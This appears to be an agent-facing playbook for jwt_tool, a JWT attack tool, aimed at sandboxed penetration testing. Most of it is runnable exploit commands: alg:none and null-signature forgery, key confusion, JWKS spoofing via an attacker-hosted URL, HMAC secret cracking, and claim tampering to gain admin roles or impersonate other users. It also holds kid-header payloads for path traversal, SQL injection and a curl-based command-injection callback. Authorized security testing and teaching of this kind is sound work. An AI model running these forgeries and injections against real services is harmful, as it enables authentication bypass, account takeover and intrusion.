---
name: jwt_tool
description: jwt_tool exploit modes, signing options, and automated scan playbooks for JWT attack and analysis.
---

# jwt_tool CLI Playbook

Official docs:
- https://github.com/ticarpi/jwt_tool
- https://github.com/ticarpi/jwt_tool/wiki

Canonical syntax:
`jwt_tool [options] [jwt]` (positional `jwt` omitted when `-r <request_file>` carries the token in a header/cookie)

The sandbox ships jwt_tool as a wrapper at `/home/pentester/.local/bin/jwt_tool` that execs `jwt_tool.py` under the Caido-aware venv. Config lives at `~/.jwt_tool/jwtconf.ini`.

High-signal flags:
- `-M, --mode <pb|er|cc|at>` scanning mode (`pb` playbook audit, `er` error-fuzz existing claims, `cc` common-claims fuzz, `at` all tests)
- `-X, --exploit <a|n|b|p|s|k|i>` eXploit a known vulnerability
  - `a` alg:none, `n` null signature, `b` blank password accepted, `p` ECDSA psychic signature, `s` spoof JWKS (needs `-ju`), `k` key confusion (needs `-pk`), `i` inject inline JWKS
- `-S, --sign <alg>` sign resulting token (`hs256/hs384/hs512`, `rs256/rs384/rs512`, `es256/es384/es512`, `ps256/ps384/ps512`)
- `-T, --tamper` interactive tamper of claims (combine with `-S` or `-X`)
- `-I, --injectclaims` inject/override claims non-interactively (set `-hc/-pc` and `-hv/-pv`)
- `-hc <claim>` / `-pc <claim>` header-/payload-claim to tamper
- `-hv <value>` / `-pv <value>` value (or wordlist file) to inject into the tampered claim
- `-C, --crack` crack an HMAC secret (needs one of `-d <wordlist>`, `-p <password>`, `-kf <keyfile>`)
- `-V, --verify` verify an asymmetric signature (needs `-pk <pubkey>` or `-jw <jwks>`)
- `-pr <privkey>` private key for asymmetric sign; `-pk <pubkey>` public key for verify / key-confusion
- `-ju <url>` JWKS URL for spoof (`-X s`)
- `-jw <file>` local JWKS file for verify / inline JWKS
- `-t, --targeturl <url>` target URL for the forged request (`-M` modes exercise this)
- `-r, --request <file>` base HTTP request file to carry the token in context
- `-rc <cookies>` / `-rh <headers>` / `-pd <postdata>` request extras for the forged send
- `-cv <string>` canary string that proves a valid-token response (e.g. "Welcome, user")
- `-rt <rpm>` rate limit (requests per minute)
- `-Q, --query <id>` query a token ID against the logfile to retrieve request/response details (e.g. `-Q jwttool_46820e62fe25c10a3f5498e426a9f03a`)
- `-i, --insecure` use HTTP (not HTTPS) for the forged request
- `-np, --noproxy` disable proxy for this run (default honors `jwtconf.ini` → in the sandbox, Caido)
- `-nr, --noredir` disable redirects
- `-b, --bare` print tokens only (pipeline-friendly)
- `-v, --verbose` produce slightly more verbose output when parsing and printing

Agent-safe baseline for automation:
`jwt_tool -r req.txt -cv "Welcome, admin" -rt 60 -M at -b`
(audits the token embedded in `req.txt` against the live endpoint, 60 rpm, bare output; `req.txt` is a raw HTTP request captured from Caido)

Common patterns:
- Decode and dry-run audit (no network):
  `jwt_tool <token> -M pb`
- Live playbook audit against the forging target:
  `jwt_tool -r req.txt -cv "Welcome, admin" -M pb -b`
- alg:none exploit, keep structure, resign:
  `jwt_tool <token> -X a`
- HMAC secret crack with wordlist:
  `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`
- Key confusion (RS256 → HS256 using fetched pubkey):
  `jwt_tool <token> -X k -pk server_pubkey.pem`
- Spoof JWKS at attacker URL:
  `jwt_tool <token> -X s -ju https://attacker.tld/jwks.json`
- Inject admin role claim and resign HS256 with cracked secret:
  `jwt_tool <token> -I -pc role -pv admin -S hs256 -p "<cracked_secret>"`
- Verify a token against the discovered public key:
  `jwt_tool <token> -V -pk server_pubkey.pem`

Critical correctness rules:
- `-r <request_file>` must be a **raw** HTTP request (first line `METHOD /path HTTP/1.1`, then headers, blank line, body) — Caido's "Copy as raw" export is the canonical source.
- `-cv <canary>` is what distinguishes auth-success from auth-failure in `-M` modes; without an accurate canary, every forged token looks "accepted" and the scan is noise.
- `-X s` spoof requires the attacker JWKS at `-ju` to actually serve back a matching key — host it yourself (interactsh HTTP, static file, etc.); jwt_tool does not stand up the server.
- `-X k` key confusion needs the **exact** PEM public key the server validates with — a mismatched key fails silently and reports no vulnerability.
- Signing modes (`-S`) require the matching key material: HMAC → `-p <secret>`/`-kf <secret>`, asymmetric → `-pr <privkey>`.
- The tool honors `jwtconf.ini` proxy settings — in the sandbox that routes through Caido, so forged tokens show up in `list_requests`. Pass `-np` only when you specifically need to bypass Caido.
- Rate-limit everything (`-rt`) when exercising live endpoints; brute modes and `-M at` can issue hundreds of requests.

Usage rules:
- Prefer `-r <request_file>` over `-t <url>` for anything beyond decode — real cookies/headers/anti-CSRF context matters.
- Keep `-b` on in automation and capture stdout; the banner/colorized stream is not pipeline-friendly.
- Store cracked secrets outside the project tree; `jwt_tool` writes them to `~/.jwt_tool/` by default.
- Do not use `-h`/`--help` for routine runs unless absolutely necessary.

Failure recovery:
- "no valid signature" during `-V`: wrong public key or wrong algorithm — fetch the server's JWKS fresh (`curl /.well-known/jwks.json`) and retry.
- All forged tokens report "accepted": `-cv` is wrong — grep an authenticated response for a unique string and set that.
- Crack never finishes against HS256: switch wordlists, or confirm the token is actually HMAC (`-M pb` prints `alg`).
- Request file errors: ensure trailing CRLF and that `Content-Length` matches the body length exactly; jwt_tool does not recompute it.

If uncertain, query web_search with:
`site:github.com/ticarpi/jwt_tool/wiki jwt_tool <flag>`

---

## JWT Attack Catalogue — `-X` Exploit Matrix

Each `-X` mode exercises a specific JWT implementation weakness. The mode letters map to CVEs or named vulnerability classes. Run each against the live endpoint with `-r req.txt -cv <canary>` to confirm exploitability, or dry-run with just the token to inspect the forged output.

### `a` — Algorithm None (CVE-2015-2951)

Sets the `alg` header to `none` (and variants: `None`, `NONE`, `nOnE`, `nonE`) and strips the signature. Exploits libraries that accept unsigned tokens when `alg` is `none`.

```bash
jwt_tool <token> -X a
```

jwt_tool generates multiple casing variants automatically. If any variant passes `-cv`, the server accepts unsigned tokens.

Live confirmation:
```bash
jwt_tool -r req.txt -cv "Welcome" -X a -b
```

The forged tokens appear in stdout (bare mode). Grep for lines that produced a canary match in the jwt_tool output — those are the accepted variants.

### `n` — Null Signature (CVE-2020-28042)

Keeps the original `alg` claim intact but sets the signature to a zero-length value. Distinct from `a`: the algorithm header is preserved, so this bypasses servers that reject `alg:none` but don't validate signature length.

```bash
jwt_tool <token> -X n
```

### `b` — Blank Password

Signs the token with an empty string as the HMAC key. Exploits implementations that initialize a default empty-string secret or fail to reject zero-length keys.

```bash
jwt_tool <token> -X b
```

If accepted: the server's HMAC secret is the empty string. Re-sign arbitrary claims with `-S hs256 -p ""`.

### `p` — ECDSA Psychic Signature (CVE-2022-21449)

Generates an ECDSA signature with all-zero `r` and `s` values. Exploits a Java (JDK 15–17) bug where the JCA ECDSA verifier accepted degenerate `(0,0)` signatures as valid for any message.

```bash
jwt_tool <token> -X p
```

Precondition: the target must use a vulnerable JDK version with ECDSA verification (ES256/ES384/ES512). If the server accepts, any token body passes signature validation — forge arbitrary claims without key material.

### `s` — JWKS Spoof (JKU/X5U Exploitation)

Generates a new RSA key pair, builds a JWKS containing the public key, and signs the token with the private key. The forged token's `jku` header claim points to `-ju <url>` where the attacker-hosted JWKS must be reachable by the server.

```bash
jwt_tool <token> -X s -ju https://attacker.tld/.well-known/jwks.json
```

The server fetches `https://attacker.tld/.well-known/jwks.json`, retrieves the attacker's public key, and validates the signature — which passes because jwt_tool signed with the matching private key.

Hosting the JWKS:
```bash
# Option 1: interactsh-client file hosting
interactsh-client -fl jwks.json -fsf hosted_urls.txt -duc
# Use the hosted URL as -ju

# Option 2: python http.server
python3 -m http.server 8888 &
jwt_tool <token> -X s -ju http://<attacker-ip>:8888/jwks.json
```

Preconditions:
- The server must follow the `jku` claim to fetch keys (many implementations pin the JWKS URL or ignore `jku` entirely).
- The `-ju` URL must be reachable from the server at verification time.
- jwt_tool writes the generated JWKS to `~/.jwt_tool/` — retrieve it from there if you need to host it manually.

### `k` — Key Confusion / Algorithm Switching (CVE-2016-10555)

Exploits libraries that use the `alg` header to select the verification algorithm without constraining it. If the server's code does `verify(token, public_key)` and the library honors `alg: HS256`, it treats the RSA public key as an HMAC secret.

```bash
jwt_tool <token> -X k -pk server_pubkey.pem
```

Obtain the public key first:
```bash
# From JWKS endpoint
curl -sS https://target.tld/.well-known/jwks.json | python3 -c "
import json, sys, base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
jwks = json.load(sys.stdin)
# Extract the first RSA key and convert to PEM
key = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = rsa.RSAPublicNumbers(e, n).public_key()
print(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode())
" > server_pubkey.pem

# Or from TLS certificate
openssl s_client -connect target.tld:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > server_pubkey.pem
```

The forged token has `alg: HS256` and is HMAC-signed with the public key bytes. If accepted, the server is vulnerable to algorithm confusion.

### `i` — Inline JWKS Injection (CVE-2018-0114)

Generates a new key pair and embeds the public key directly in the token's `jwk` header claim. Signs with the matching private key.

```bash
jwt_tool <token> -X i
```

Exploits servers that trust an embedded `jwk` header without checking it against a known key store. No external hosting required — the attack is self-contained.

---

## kid Header Injection

The `kid` (Key ID) header claim tells the server which key to use for verification. If the server uses `kid` in a file path, database query, or command without sanitization, it becomes an injection point. jwt_tool exercises this via `-I -hc kid -hv <payload>`.

### Path Traversal via kid

If the server reads key material from a file path derived from `kid`:

```bash
# Sign with /dev/null (empty file → empty key)
jwt_tool <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# Sign with a known-content file
jwt_tool <token> -I -hc kid -hv "../../../../../../etc/hostname" -S hs256 -p "$(cat /etc/hostname)"
```

The signing secret (`-p`) must match what the server reads from the traversed path. `/dev/null` → empty string is the classic case. `/proc/self/environ` can work if the environment is predictable.

### SQL Injection via kid

If `kid` is used in a SQL query to look up key material:

```bash
# Force a known key value via UNION SELECT
jwt_tool <token> -I -hc kid -hv "nonexistent' UNION SELECT 'attackerkey123' -- " -S hs256 -p "attackerkey123"
```

The UNION SELECT returns `attackerkey123` as the key; jwt_tool signs with `-p "attackerkey123"` to match. Adapt the SQL syntax to the backend (MySQL vs PostgreSQL vs SQLite quoting, column count).

### Command Injection via kid

Rare, but if `kid` is passed to a shell command:

```bash
jwt_tool <token> -I -hc kid -hv "; curl https://<oast-payload>.oast.pro; " -S hs256 -p ""
```

Confirm via OAST callback (interactsh-client). The signing key is irrelevant here — the goal is the side effect, not signature validation.

### kid Injection Methodology

1. Decode the token (`jwt_tool <token> -M pb`) — note the current `kid` value and format.
2. Test path traversal: start with `/dev/null` + empty key.
3. Test SQLi: error-based first (single quote in kid, observe 500), then UNION SELECT.
4. Test command injection: OAST callback in kid, observe interactsh-client.
5. Each test requires `-S hs256 -p <matching_key>` — the signature must be valid for the key the server actually retrieves/computes from the injected `kid`.

---

## jku / x5u Header Spoofing

Beyond `-X s` (which automates `jku` spoofing), manual `jku` and `x5u` attacks target servers that fetch verification keys from URLs specified in the token header.

### jku (JSON Web Key Set URL)

The `jku` header points to a JWKS endpoint. If the server follows it without domain pinning:

```bash
# Generate key pair
openssl genrsa -out attacker_priv.pem 2048
openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem

# Build JWKS from the public key (use jwt_tool's -X s output or manual construction)
# Host the JWKS file

# Forge the token with jku pointing to the hosted JWKS
jwt_tool <token> -I -hc jku -hv "https://attacker.tld/jwks.json" -S rs256 -pr attacker_priv.pem
```

Or use the automated path:
```bash
jwt_tool <token> -X s -ju https://attacker.tld/jwks.json
```

### x5u (X.509 Certificate Chain URL)

Same pattern as `jku` but the URL points to a PEM-encoded X.509 certificate chain. Less common in practice but functionally identical — server fetches the cert, extracts the public key, validates the signature.

```bash
# Create self-signed cert from the attacker key
openssl req -new -x509 -key attacker_priv.pem -out attacker_cert.pem -days 1 -subj "/CN=attacker"

# Host attacker_cert.pem, inject x5u
jwt_tool <token> -I -hc x5u -hv "https://attacker.tld/cert.pem" -S rs256 -pr attacker_priv.pem
```

### Bypass Conditions and Mitigations to Test Against

Servers may defend with:
- **Domain pinning**: only fetch from allowlisted domains → test with subdomain takeover, open redirect on the allowlisted domain, or URL parser confusion (`attacker.tld#@allowed.tld`).
- **HTTPS enforcement**: reject HTTP `jku`/`x5u` URLs → host over HTTPS.
- **Ignoring jku/x5u entirely**: server uses a hardcoded JWKS URI → these attacks are N/A; move to `kid` injection or key confusion instead.

---

## Scanning Modes — `-M` Methodology

### `pb` — Playbook Audit

Offline analysis of token structure. No network traffic unless `-t`/`-r` is provided.

```bash
jwt_tool <token> -M pb
```

Reports:
- Algorithm and key type
- Claim analysis (expiry, `iat`, `nbf`, `iss`, `aud`, custom claims)
- Known-vulnerable patterns (weak alg, missing expiry, `none` acceptance)
- Header claim presence (`kid`, `jku`, `x5u`, `jwk`)

Use as the first step in every JWT assessment. The output identifies which `-X` modes and injection vectors are worth testing.

### `er` — Error Fuzz Existing Claims

Mutates each existing claim value to provoke error responses: type confusion (string → int → bool → null → array), boundary values (negative numbers, epoch extremes, overlong strings), and special characters.

```bash
jwt_tool -r req.txt -cv "Welcome" -M er -b -rt 60
```

Reveals:
- Claims the server actually validates (error response changes)
- Type confusion weaknesses (int-as-string accepted for admin flag)
- Verbose error messages that leak implementation details

### `cc` — Common Claims Fuzz

Injects common claim names not present in the original token: `admin`, `role`, `group`, `is_admin`, `privilege`, `scope`, `permissions`, `email`, `username`, and others from jwt_tool's built-in wordlist.

```bash
jwt_tool -r req.txt -cv "Welcome" -M cc -b -rt 60
```

Reveals claims the server recognizes but the original token omitted — potential for privilege escalation if a missing `admin: true` claim is honored.

### `at` — All Tests

Runs `pb` + `er` + `cc` in sequence, plus exercises all `-X` exploit modes against the live endpoint. Generates the most traffic.

```bash
jwt_tool -r req.txt -cv "Welcome" -M at -b -rt 30
```

Always rate-limit (`-rt`). Review output for canary matches — each represents a forged token the server accepted.

### Scanning Pipeline

```
1. jwt_tool <token> -M pb                            # offline structure analysis
2. Identify attack surface from pb output             # alg, kid presence, claim set
3. jwt_tool -r req.txt -cv <canary> -M er -b -rt 60  # error fuzz — find validated claims
4. jwt_tool -r req.txt -cv <canary> -M cc -b -rt 60  # common claims — find missing privesc
5. Targeted -X exploits based on findings             # alg:none, key confusion, etc.
6. jwt_tool -r req.txt -cv <canary> -M at -b -rt 30  # full sweep (if time allows)
```

### Canary Design

`-cv` must match a string that appears **only** in a valid-token response and **never** in an error/401 response:
- Good: `"Welcome, testuser"`, `"dashboard"`, a unique HTML element in the authenticated page
- Bad: `"200 OK"` (appears in many responses), `"<html>"` (appears in error pages too)

Test the canary before scanning: send the original valid token and confirm `-cv` matches; send an expired/invalid token and confirm it does not.

---

## HMAC Secret Cracking — `-C`

### Dictionary Attack

```bash
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

jwt_tool tries each line as the HMAC secret and prints the match. Works for HS256/HS384/HS512.

### Single Password Test

```bash
jwt_tool <token> -C -p "secret123"
```

Quick check against a suspected secret (from config leak, default credential, etc.).

### Key File

```bash
jwt_tool <token> -C -kf /path/to/keyfile
```

Uses the raw file bytes as the HMAC key — for tokens signed with a binary key or certificate file used as HMAC input (kid-based key retrieval).

### Cracking Methodology

1. Confirm the token uses HMAC: `jwt_tool <token> -M pb` — check `alg` is `HS256`/`HS384`/`HS512`.
2. Start with common secrets: `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`
3. If no match, try targeted wordlists: application name, domain, `secret`, `password`, known defaults for the framework.
4. For high-entropy secrets, hand off to GPU cracking:
   ```bash
   # Extract the hash for hashcat
   # hashcat mode 16500 = JWT (HS256/HS384/HS512)
   echo "<full_jwt>" > jwt_hash.txt
   hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt
   ```
5. Cracked secret → re-sign arbitrary claims: `jwt_tool <token> -I -pc role -pv admin -S hs256 -p "<secret>"`

### Confirming a Cracked Secret

```bash
# Verify: re-sign the original token and compare
jwt_tool <token> -S hs256 -p "<cracked_secret>" -b
# The output token should match the original (minus exp/iat if re-encoded)

# Or verify live:
jwt_tool -r req.txt -cv "Welcome" -I -pc sub -pv "original_sub_value" -S hs256 -p "<cracked_secret>" -b
```

---

## Claim Injection and Tampering

### Non-Interactive Injection (`-I`)

Inject or override claims without prompts. Combine with `-S` for signing or `-X` for exploits.

```bash
# Escalate role
jwt_tool <token> -I -pc role -pv admin -S hs256 -p "<secret>"

# Change subject (IDOR via JWT)
jwt_tool <token> -I -pc sub -pv "victim_user_id" -S hs256 -p "<secret>"

# Add missing admin claim
jwt_tool <token> -I -pc is_admin -pv true -S hs256 -p "<secret>"

# Set arbitrary expiry (extend session)
jwt_tool <token> -I -pc exp -pv 9999999999 -S hs256 -p "<secret>"
```

### Header Claim Injection (`-hc`/`-hv`)

Modify header claims (kid, jku, x5u, alg, typ):

```bash
# Inject kid for path traversal
jwt_tool <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# Change algorithm
jwt_tool <token> -I -hc alg -hv HS256 -S hs256 -p "<pubkey_bytes>"
```

### Wordlist Injection

When `-pv` or `-hv` points to a file, jwt_tool iterates each line as a value, generating one forged token per line:

```bash
# Fuzz user IDs for IDOR
seq 1 1000 > user_ids.txt
jwt_tool <token> -I -pc sub -pv user_ids.txt -S hs256 -p "<secret>" -b

# Fuzz role values
echo -e "admin\nroot\nsuper\nmanager\noperator" > roles.txt
jwt_tool -r req.txt -cv "admin panel" -I -pc role -pv roles.txt -S hs256 -p "<secret>" -b -rt 60
```

### Interactive Tamper (`-T`)

Opens a step-by-step prompt to modify individual claims, then optionally sign or exploit:

```bash
jwt_tool <token> -T
# Follow prompts to select header/payload, choose claim, enter new value
# Then sign with -S or apply -X exploit
```

Use `-T` for one-off manual exploration. Use `-I` for automation and scripting.

### Combining Injection with Exploits

```bash
# Inject admin role AND test alg:none
jwt_tool <token> -I -pc role -pv admin -X a

# Inject claims AND test key confusion
jwt_tool <token> -I -pc role -pv admin -X k -pk server_pubkey.pem

# Iterate role values with JWKS spoof
jwt_tool <token> -I -pc role -pv roles.txt -X s -ju https://attacker.tld/jwks.json -b
```

---

## Signing and Verification

### Supported Algorithms (12 total)

| Family | Algorithms | Key Material (sign) | Key Material (verify) |
|--------|-----------|--------------------|-----------------------|
| HMAC-SHA | `hs256`, `hs384`, `hs512` | `-p <secret>` or `-kf <keyfile>` | same secret |
| RSA | `rs256`, `rs384`, `rs512` | `-pr <privkey.pem>` | `-pk <pubkey.pem>` or `-jw <jwks.json>` |
| ECDSA | `es256`, `es384`, `es512` | `-pr <privkey.pem>` | `-pk <pubkey.pem>` or `-jw <jwks.json>` |
| PSS-RSA | `ps256`, `ps384`, `ps512` | `-pr <privkey.pem>` | `-pk <pubkey.pem>` or `-jw <jwks.json>` |

### Re-Signing Workflow

After cracking a secret or obtaining key material:

```bash
# HMAC re-sign with cracked secret
jwt_tool <token> -I -pc role -pv admin -S hs256 -p "cracked_secret"

# RSA re-sign with obtained private key
jwt_tool <token> -I -pc role -pv admin -S rs256 -pr leaked_private.pem

# ECDSA re-sign
jwt_tool <token> -I -pc sub -pv "target_id" -S es256 -pr ec_private.pem
```

### Verification

Confirm a token's signature against known key material:

```bash
# Verify against public key
jwt_tool <token> -V -pk server_pubkey.pem

# Verify against JWKS file
jwt_tool <token> -V -jw server_jwks.json
```

Use verification to:
- Confirm you have the correct public key before attempting key confusion (`-X k`).
- Validate that a cracked HMAC secret is correct.
- Confirm a token's provenance when analyzing intercepted traffic.

---

## Logfile Query (`-Q`)

jwt_tool logs every forged token and its associated request/response to `~/.jwt_tool/jwttool_custom_payloads.log` and `~/.jwt_tool/jwttool_run.log`, assigning each a unique ID (e.g. `jwttool_46820e62fe25c10a3f5498e426a9f03a`).

```bash
# Query a specific token ID
jwt_tool -Q jwttool_46820e62fe25c10a3f5498e426a9f03a
```

Returns the full detail of that forged request: the original token, the modifications made, the forged token, and the response received.

Use cases:
- Post-scan triage after `-M at`: the scan output references token IDs for interesting responses — query each to understand exactly what modification triggered the behavior.
- Evidence collection: correlate a specific forged token with its server response for reporting.
- Resume investigation: query tokens from a previous session without re-running the scan.

---

## Request Context and Proxy Integration

### Raw Request File (`-r`)

The canonical input for live testing. Must be a raw HTTP request with CRLF line endings:

```
POST /api/auth/refresh HTTP/1.1\r\n
Host: target.tld\r\n
Authorization: Bearer <jwt>\r\n
Content-Type: application/json\r\n
Cookie: session=abc123\r\n
\r\n
{"refresh": true}\r\n
```

- Export from Caido: right-click request → "Copy as raw" → save to file.
- `Content-Length` must exactly match the body; jwt_tool does not recompute it.
- jwt_tool finds the JWT in `Authorization: Bearer`, `Cookie`, or the body — it searches common locations automatically.

### Direct URL (`-t`)

Simpler but loses context:

```bash
jwt_tool <token> -t https://target.tld/api/protected -X a
```

Use `-t` for quick decode/exploit checks. Use `-r` for anything that requires cookies, custom headers, CSRF tokens, or POST data.

### Request Supplements

Add extra context to the forged request:

```bash
# Additional cookies
jwt_tool -r req.txt -rc "session=abc123; tracking=xyz" -cv "Welcome" -M pb -b

# Additional headers
jwt_tool -r req.txt -rh "X-Custom-Header: value" -cv "Welcome" -M pb -b

# POST data (for application/x-www-form-urlencoded targets)
jwt_tool <token> -t https://target.tld/login -pd "username=admin&token=JWT_PLACEHOLDER" -cv "Welcome"
```

### Proxy Behavior

`jwtconf.ini` sets the default proxy. In the sandbox, this routes through Caido on port 48080 — forged requests appear in `list_requests` alongside legitimate traffic.

```bash
# Default: through Caido (no flag needed)
jwt_tool -r req.txt -cv "Welcome" -M pb -b

# Bypass Caido proxy for this run
jwt_tool -r req.txt -cv "Welcome" -M pb -b -np

# Force HTTP (not HTTPS) for the forged request
jwt_tool -r req.txt -cv "Welcome" -M pb -b -i
```

`-np` is useful when:
- Caido is not running or not needed for this test.
- The target endpoint rejects proxied connections.
- You want to avoid polluting the Caido request log with hundreds of fuzzed requests.

`-i` is useful when:
- The target accepts HTTP only (dev/staging environment without TLS).
- You are testing through a local HTTP proxy that doesn't handle TLS.

---

## Tool Chaining

### Reconnaissance → Exploit Pipeline

```bash
# 1. Discover JWKS endpoint
curl -sS https://target.tld/.well-known/jwks.json -o jwks.json
curl -sS https://target.tld/.well-known/openid-configuration | jq -r '.jwks_uri'

# 2. Extract public key to PEM
python3 -c "
import json, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
jwks = json.load(open('jwks.json'))
k = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(k['n']+'=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(k['e']+'=='), 'big')
pub = RSAPublicNumbers(e, n).public_key()
open('server_pub.pem','wb').write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
"

# 3. Verify the token to confirm correct key
jwt_tool <token> -V -pk server_pub.pem

# 4. Attempt key confusion
jwt_tool <token> -X k -pk server_pub.pem
```

### HMAC Crack → Privilege Escalation

```bash
# 1. Crack the HMAC secret
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
# Output: [+] secret123 is the CORRECT key!

# 2. Inject admin claim with cracked secret
jwt_tool <token> -I -pc role -pv admin -S hs256 -p "secret123" -b

# 3. Live confirmation
jwt_tool -r req.txt -cv "admin panel" -I -pc role -pv admin -S hs256 -p "secret123" -b
```

### JWKS Spoof with interactsh-client File Hosting

```bash
# 1. Generate spoofed token and JWKS (jwt_tool -X s writes JWKS to ~/.jwt_tool/)
jwt_tool <token> -X s -ju https://placeholder.tld/jwks.json -b

# 2. Retrieve the generated JWKS
cp ~/.jwt_tool/jwks_with_new_key.json ./attacker_jwks.json

# 3. Host via interactsh-client
interactsh-client -fl attacker_jwks.json -fsf hosted_urls.txt -duc -json -o oast.jsonl
# Read the hosted URL from hosted_urls.txt

# 4. Re-forge with the real hosted URL
jwt_tool <token> -X s -ju "$(cat hosted_urls.txt | head -1)" -b

# 5. Send to target
jwt_tool -r req.txt -cv "Welcome" -X s -ju "$(cat hosted_urls.txt | head -1)" -b
```

### Caido Integration Loop

```bash
# 1. Capture authenticated request in Caido → export raw
# (Caido "Copy as raw" → save as req.txt)

# 2. Run jwt_tool (proxy ON, routes back through Caido)
jwt_tool -r req.txt -cv "Welcome" -M at -b -rt 30

# 3. Review forged requests in Caido
# All forged tokens appear in Caido's request history for manual inspection

# 4. Query interesting token IDs from the scan
jwt_tool -Q jwttool_<interesting_id>
```

### Output → Nuclei / httpx Validation

```bash
# 1. Extract endpoints that accepted forged tokens
jwt_tool -r req.txt -cv "Welcome" -M at -b 2>&1 | grep "VALID" > accepted.txt

# 2. Feed unique URLs to httpx for response analysis
cat accepted.txt | httpx -silent -status-code -content-length -title

# 3. Or run nuclei against the endpoint for further vuln detection
echo "https://target.tld" | nuclei -t cves/ -H "Authorization: Bearer <forged_token>"
```

---

## Automation and Output Parsing

### Bare Mode Output

`-b/--bare` strips the banner and formatting, outputting one token per line:

```bash
jwt_tool <token> -X a -b > forged_tokens.txt
```

Each line is a complete JWT ready for injection into `Authorization: Bearer` or cookies.

### Parsing Scan Results

jwt_tool's `-M` output includes markers for accepted/rejected tokens. In bare mode, only tokens are printed; match results appear in the log:

```bash
# Run scan and capture both stdout and log
jwt_tool -r req.txt -cv "Welcome" -M at -b > tokens.txt 2> scan.log

# Review the log for canary matches
grep -i "VALID" ~/.jwt_tool/jwttool_run.log | tail -20

# Cross-reference with token IDs
grep "jwttool_" ~/.jwt_tool/jwttool_run.log | grep "VALID"
```

### Rate Limiting

Always set `-rt <rpm>` for live endpoint testing:

| Mode | Recommended `-rt` | Rationale |
|------|-------------------|-----------|
| `-M pb` (offline) | N/A | No network traffic |
| `-M pb` (live) | 60 | Low volume, informational |
| `-M er` | 30–60 | Medium volume, per-claim fuzzing |
| `-M cc` | 30–60 | Medium volume, claim discovery |
| `-M at` | 15–30 | High volume, all tests combined |
| `-X` (single) | 60+ | Single forged request |
| `-C` (crack) | N/A | Offline computation, no network |

### Exit Behavior

jwt_tool does not use structured exit codes for pass/fail. Parse stdout and the logfile for results:

```bash
# Check if any forged token was accepted
if grep -q "VALID" ~/.jwt_tool/jwttool_run.log; then
  echo "Vulnerable: at least one forged token was accepted"
fi
```

### Batch Automation

```bash
# Test multiple tokens from a file
while IFS= read -r token; do
  echo "=== Testing token ==="
  jwt_tool "$token" -M pb -b 2>/dev/null
done < tokens.txt

# Test multiple endpoints with the same forged token
FORGED=$(jwt_tool <token> -X a -b 2>/dev/null | head -1)
for url in $(cat endpoints.txt); do
  curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $FORGED" "$url"
done
```

---

## jwtconf.ini Reference

The config file at `~/.jwt_tool/jwtconf.ini` controls default behavior:

Key settings:
- `proxyAddr` — default proxy address (sandbox: `http://127.0.0.1:48080` for Caido)
- `jwks_kid` — default kid value for generated JWKS
- `jwks_file` — path to write generated JWKS
- `log_file` — path for the run log

Override per-run with flags (`-np` for proxy bypass, `-ju` for JWKS URL, etc.). Edit the config only for persistent changes.

Routed consumers:
- `vulnerabilities/authentication_jwt.md` (end-to-end JWT attack class — exploit selection, kid injection, confusion, kid=../, JWKS spoof)
- `tooling/caido.md` (export the base request for `-r`; forged sends re-enter Caido's history)
- `tooling/interactsh-client.md` (JWKS file hosting via `-fl` for `-X s` spoof attacks)
